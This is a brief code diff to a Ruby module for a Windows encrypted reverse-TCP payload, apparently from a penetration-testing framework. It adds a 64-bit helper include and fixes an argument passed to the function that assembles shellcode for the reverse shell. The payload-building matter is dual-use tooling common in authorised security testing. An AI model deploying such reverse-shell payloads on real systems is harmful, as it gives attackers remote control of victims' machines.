@@ -57,6 +57,7 @@ module Payload::Windows::EncryptedReverseTcp
 
   def initial_code(conf)
     src = headers
+    src << '  #include "64BitHelper.h"' if self.arch_to_s.eql?(ARCH_X64)
     src << chacha_key(conf)
     src << chacha_func
     src << exit_proc
@@ -89,7 +90,7 @@ module Payload::Windows::EncryptedReverseTcp
       arch:          self.arch_to_s
     }
 
-    src = initial_code
+    src = initial_code(opts)
     src << init_proc
     src << exec_payload_stage
     shellcode = get_compiled_shellcode(src, comp_opts)
